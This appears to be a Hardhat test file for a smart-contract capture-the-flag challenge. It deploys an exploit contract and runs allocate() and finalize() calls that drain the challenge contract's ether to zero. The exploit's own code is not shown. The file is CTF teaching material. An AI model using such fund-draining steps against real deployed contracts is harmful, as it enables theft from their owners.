const { expect } = require('chai');

// run the test
// npx hardhat test ./test/N5-BecomeMaster-medium.js
describe('CTF #5 BecomeMaster', function () {
    before(async function () {
    [deployer, alice] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory('N5BecomeMaster');
    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') });
    await challengeInstance.deployed();
  });

  it('Should recover all funds', async function () {
    const ch2 = await ethers.getContractFactory('N5ExploitHack');
    let N5_hack = await ch2.deploy(challengeInstance.address);
 
    await challengeInstance.connect(alice).allocate();
    await N5_hack.connect(alice).finalize()
    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0');
  });
});
